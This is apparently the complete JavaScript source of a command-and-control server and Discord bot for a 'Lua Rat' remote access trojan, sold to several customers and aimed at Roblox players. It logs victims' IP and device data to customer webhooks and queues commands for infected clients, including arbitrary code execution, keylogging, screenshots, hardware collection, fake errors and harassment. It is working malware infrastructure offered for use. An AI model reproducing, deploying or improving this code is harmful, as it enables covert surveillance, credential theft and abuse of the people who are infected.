const express = require('express');
const fetch = require('node-fetch');
const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField } = require('discord.js');
const cors = require('cors');

// ========== КОНФИГУРАЦИЯ ==========
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const PORT = process.env.PORT || 10000;
const SERVER_URL = process.env.RENDER_EXTERNAL_URL || `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` || `http://localhost:${PORT}`;
const ADMIN_ID = process.env.ADMIN_ID;

console.log('========================================');
console.log('Lua Rat Server v3.2 - Final');
console.log('========================================');

// ========== ЗАГРУЗКА ПОКУПАТЕЛЕЙ ==========
const customers = new Map();

for (let i = 1; i <= 10; i++) {
    const customerKey = process.env[`CUSTOMER_${i}_KEY`];
    const webhook = process.env[`WEBHOOK_${i}`];
    const discordId = process.env[`CUSTOMER_${i}_ID`];
    
    if (customerKey && webhook) {
        customers.set(customerKey, {
            id: i,
            name: `User-${i}`,
            discordId: discordId || null,
            webhook: webhook,
            users: new Map(),
            key: customerKey,
            createdAt: new Date().toISOString()
        });
        console.log(`✅ Панель ${i}: User-${i} | ID: ${discordId || 'не задан'}`);
    }
}

console.log(`\n📊 Всего панелей: ${customers.size}`);
if (ADMIN_ID) console.log(`👑 Админ ID: ${ADMIN_ID}`);
console.log('========================================\n');

// ========== ХРАНИЛИЩЕ ==========
let commandQueue = [];

// ========== EXPRESS ==========
const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// ========== ФУНКЦИЯ ВЕБХУКА ==========
async function sendToWebhook(webhookUrl, title, description, color = 0x00ff00, fields = []) {
    if (!webhookUrl) return false;
    
    try {
        const embed = {
            title: title,
            description: description,
            color: color,
            fields: fields,
            timestamp: new Date().toISOString(),
            footer: { text: "Lua Rat System v3.2" }
        };
        
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                username: "Lua Rat Panel",
                embeds: [embed]
            })
        });
        
        return response.ok;
    } catch (error) {
        console.error('Ошибка вебхука:', error.message);
        return false;
    }
}

// ========== ПОИСК ПАНЕЛИ ПО ID ==========
function getCustomerByDiscordId(discordId) {
    for (let [key, customer] of customers) {
        if (customer.discordId === discordId) {
            return { customer_key: key, customer: customer };
        }
    }
    return null;
}

// ========== API ==========
app.get('/data', (req, res) => {
    const player = req.query.player;
    const customer_key = req.query.customer_key;
    
    if (!player || !customer_key) return res.json({ command: "", args: [] });
    
    const customer = customers.get(customer_key);
    if (!customer) return res.json({ command: "", args: [] });
    
    if (customer.users.has(player)) {
        customer.users.get(player).lastSeen = Date.now();
    }
    
    const commandIndex = commandQueue.findIndex(cmd => 
        cmd.customer_key === customer_key && 
        (!cmd.target || cmd.target === player || cmd.target === 'all')
    );
    
    if (commandIndex !== -1) {
        const cmd = commandQueue[commandIndex];
        commandQueue.splice(commandIndex, 1);
        console.log(`📨 ${cmd.command} -> ${player} (${customer.name})`);
        res.json({ command: cmd.command, args: cmd.args || [] });
    } else {
        res.json({ command: "", args: [] });
    }
});

app.post('/command', async (req, res) => {
    const { command, args, target, customer_key } = req.body;
    
    const customer = customers.get(customer_key);
    if (!customer) return res.status(403).json({ error: "Invalid customer key" });
    
    if (command === "inject_notify" && args && args.length >= 5) {
        const playerName = args[0];
        const gameName = args[1];
        const ipInfo = args[2];
        const executor = args[3];
        const device = args[4];
        
        const existingUser = customer.users.get(playerName);
        customer.users.set(playerName, {
            player: playerName,
            place: gameName,
            executor: executor,
            device: device,
            firstSeen: existingUser?.firstSeen || Date.now(),
            lastSeen: Date.now(),
            injectCount: (existingUser?.injectCount || 0) + 1
        });
        
        const description = `**Игрок:** ${playerName}\n**Игра:** ${gameName}\n**Инжектор:** ${executor}\n**Устройство:** ${device}\n\n**IP:**\n${ipInfo}`;
        
        await sendToWebhook(customer.webhook, "Новый инжект!", description, 0x00ff00);
        console.log(`💉 Инжект: ${playerName} -> ${customer.name}`);
        return res.json({ status: "OK" });
    }
    
    if (command && command !== "inject_notify") {
        if (target && !customer.users.has(target)) {
            return res.json({ status: "error", message: "Игрок не найден" });
        }
        
        commandQueue.push({
            command: command,
            args: args || [],
            target: target || null,
            customer_key: customer_key,
            timestamp: Date.now()
        });
        
        if (commandQueue.length > 100) commandQueue = commandQueue.slice(-50);
        console.log(`📝 Команда ${command} в очередь для ${customer.name}`);
    }
    
    res.json({ status: "OK", queue_size: commandQueue.length });
});

app.get('/my_users', (req, res) => {
    const customer_key = req.query.customer_key;
    const customer = customers.get(customer_key);
    if (!customer) return res.status(403).json({ error: "Invalid key" });
    
    const now = Date.now();
    for (let [key, user] of customer.users.entries()) {
        if (now - user.lastSeen > 120000) customer.users.delete(key);
    }
    
    res.json({ customer: customer.name, users: Array.from(customer.users.values()), count: customer.users.size });
});

app.get('/status', (req, res) => {
    let totalUsers = 0;
    for (let [_, customer] of customers) totalUsers += customer.users.size;
    res.json({ status: "online", version: "3.2.0", customers: customers.size, total_users: totalUsers, pending_commands: commandQueue.length });
});

app.get('/health', (req, res) => res.send('OK'));
app.get('/', (req, res) => res.json({ name: "Lua Rat System", version: "3.2.0", customers: customers.size }));

// ========== DISCORD БОТ ==========
let discordClient = null;

if (DISCORD_TOKEN) {
    discordClient = new Client({ 
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent,
            GatewayIntentBits.GuildMembers
        ] 
    });

    async function sendCommandToCustomer(command, args, target, customer_key) {
        try {
            const response = await fetch(`${SERVER_URL}/command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command, args, target, customer_key })
            });
            const data = await response.json();
            return { ok: response.ok, data: data };
        } catch (error) {
            return { ok: false, data: null };
        }
    }

    discordClient.on('ready', () => {
        console.log(`\n🤖 Бот ${discordClient.user.tag} запущен!`);
        console.log(`📋 Панели:`);
        for (let [_, customer] of customers) {
            console.log(`   • ${customer.name} — ID: ${customer.discordId || 'не задан'}`);
        }
        console.log(`\n💡 /help - список команд\n`);
        discordClient.user.setActivity('/help | Lua Rat', { type: 'WATCHING' });
    });

    discordClient.on('messageCreate', async message => {
        if (message.author.bot || !message.content.startsWith('/')) return;
        
        const userId = message.author.id;
        const isAdmin = ADMIN_ID && userId === ADMIN_ID;
        
        let args = message.content.slice(1).split(' ');
        const command = args.shift().toLowerCase();
        
        // ========== ОПРЕДЕЛЯЕМ ПАНЕЛЬ ==========
        let targetCustomer = null;
        let targetKey = null;
        
        // Админ может выбрать панель через @User-X
        let selectedPanel = null;
        if (isAdmin && args.length > 0 && args[0].startsWith('@')) {
            selectedPanel = args[0].substring(1);
            args.shift();
        }
        
        if (selectedPanel) {
            const panelNum = parseInt(selectedPanel.replace('User-', ''));
            for (let [key, customer] of customers) {
                if (customer.id === panelNum) {
                    targetKey = key;
                    targetCustomer = customer;
                    break;
                }
            }
        }
        
        // Ищем по Discord ID
        if (!targetCustomer) {
            const byId = getCustomerByDiscordId(userId);
            if (byId) {
                targetKey = byId.customer_key;
                targetCustomer = byId.customer;
            }
        }
        
        // Админ без панели - даём User-1
        if (!targetCustomer && isAdmin) {
            for (let [key, customer] of customers) {
                if (customer.id === 1) {
                    targetKey = key;
                    targetCustomer = customer;
                    break;
                }
            }
        }
        
        if (!targetCustomer) {
            return message.reply('❌ У вас нет доступа к панели');
        }
        
        // Парсим таргет
        let target = null;
        if (args.length > 0 && /^[a-zA-Z0-9_]{3,20}$/.test(args[0])) {
            target = args.shift();
        }
        
        // ========== КОМАНДЫ ==========
        
        if (command === 'users') {
            const now = Date.now();
            for (let [key, user] of targetCustomer.users.entries()) {
                if (now - user.lastSeen > 120000) targetCustomer.users.delete(key);
            }
            
            const usersList = Array.from(targetCustomer.users.values());
            const embed = new EmbedBuilder()
                .setTitle(`👥 Онлайн — ${targetCustomer.name}`)
                .setColor(usersList.length > 0 ? 0x00ff00 : 0xff0000);
            
            if (usersList.length > 0) {
                embed.setDescription(`**Всего:** ${usersList.length}`);
                const list = usersList.slice(0, 20).map(u => `• **${u.player}** — ${u.place || 'Unknown'} (${u.executor || 'Unknown'})`).join('\n');
                embed.addFields({ name: '📋 Игроки:', value: list });
            } else {
                embed.setDescription('❌ Нет активных игроков');
            }
            await message.reply({ embeds: [embed] });
        }
        
        else if (command === 'help') {
            const embed = new EmbedBuilder()
                .setTitle('Lua Rat Panel v3.2')
                .setDescription('**Полный список всех команд с поддержкой таргетинга**')
                .setColor(0x7289da)
                .addFields(
                    { 
                        name: '🎯 Формат команд:', 
                        value: '• `/команда` - для всех игроков\n• `/команда ник` - для конкретного игрока\n• `/команда ник аргументы` - с параметрами\n\n**Примеры:**\n`/fakeerror текст` - для всех\n`/fakeerror PlayerName текст` - для игрока\n`/cameralock on` - для всех\n`/cameralock PlayerName off` - для игрока', 
                        inline: false 
                    },
                    { 
                        name: '👤 Управление игроком (10 команд)', 
                        value: '`/tpgame [ник] <id места>`\n`/kick [ник] <причина>`\n`/freeze [ник] <секунды>`\n`/void [ник]`\n`/spin [ник]`\n`/fling [ник]`\n`/sit [ник]`\n`/dance [ник]`\n`/cameralock [ник] <on/off>`\n`/camerashake [ник] <секунды> <интенсивность>`', 
                        inline: false 
                    },
                    { 
                        name: '🔊 Аудио/Видео (5 команд)', 
                        value: '`/mute [ник]`\n`/unmute [ник]`\n`/playaudio [ник] <id>`\n`/blur [ник] <секунды>`\n`/screenshot [ник]`', 
                        inline: false 
                    },
                    { 
                        name: '💬 Чат (2 команды)', 
                        value: '`/chat [ник]`\n`/message [ник] <текст>`', 
                        inline: false 
                    },
                    { 
                        name: '👻 Скримеры (1 команда)', 
                        value: '`/jumpscare [ник] <тип>`\n**Типы:** 1=Джефф Килер, 2=Соник.exe', 
                        inline: false 
                    },
                    { 
                        name: '⚙️ Системные (6 команд)', 
                        value: '`/execute [ник] <код>`\n`/fakeerror [ник] <текст>`\n`/keylog [ник]`\n`/stopkeylog [ник]`\n`/hardware [ник]`\n`/hide [ник]`', 
                        inline: false 
                    },
                    { 
                        name: '💥 Spam (2 команды)', 
                        value: '`/memory [ник] <кол-во>`\n`/gallery [ник] <кол-во>`', 
                        inline: false 
                    },
                    { 
                        name: '👥 Информация (4 команды)', 
                        value: '`/users` - онлайн игроки\n`/status` - статус системы\n`/test` - тест\n`/print` - проверка связи', 
                        inline: false 
                    }
                )
                .setFooter({ text: `Всего команд: 28 | Версия: 3.2.0` });
            
            await message.reply({ embeds: [embed] });
        }
        
        else if (command === 'status') {
            const embed = new EmbedBuilder()
                .setTitle(`📊 Статус — ${targetCustomer.name}`)
                .setColor(0x7289da)
                .addFields(
                    { name: '👥 Игроки', value: `${targetCustomer.users.size}`, inline: true },
                    { name: '📨 Очередь', value: `${commandQueue.filter(c => c.customer_key === targetKey).length}`, inline: true },
                    { name: '🤖 Бот', value: '🟢 Онлайн', inline: true },
                    { name: '📦 Версия', value: '3.2.0', inline: true }
                );
            await message.reply({ embeds: [embed] });
        }
        
        else if (command === 'test') {
            const result = await sendCommandToCustomer("popup", ["Тест!"], target, targetKey);
            await message.reply(result.ok ? `✅ Тест отправлен ${target || 'всем'}` : '❌ Ошибка');
        }
        
        else if (command === 'print') {
            const result = await sendCommandToCustomer("print", [], target, targetKey);
            await message.reply(result.ok ? `📡 Проверка связи ${target || 'всем'}` : '❌ Ошибка');
        }
        
        else {
            const valid = ['kick', 'freeze', 'void', 'spin', 'fling', 'sit', 'dance', 'jumpscare', 'message', 'execute', 'fakeerror', 'blur', 'mute', 'unmute', 'playaudio', 'cameralock', 'camerashake', 'tpgame', 'keylog', 'stopkeylog', 'hardware', 'screenshot', 'memory', 'gallery', 'chat'];
            
            if (valid.includes(command)) {
                const result = await sendCommandToCustomer(command, args, target, targetKey);
                await message.reply(result.ok ? `✅ ${command} отправлена ${target || 'всем'}` : `❌ ${result.data?.message || 'Ошибка'}`);
            } else if (!['users', 'help', 'status', 'test', 'print'].includes(command)) {
                await message.reply(`❌ Неизвестная команда \`${command}\`. Используй \`/help\``);
            }
        }
    });

    discordClient.login(DISCORD_TOKEN).catch(e => console.error('❌ Ошибка:', e.message));
}

app.listen(PORT, () => {
    console.log(`\n🚀 Сервер на ${PORT}`);
    console.log(`🤖 Бот: ${DISCORD_TOKEN ? '✅' : '❌'}`);
    console.log(`📊 Панелей: ${customers.size}\n`);
});
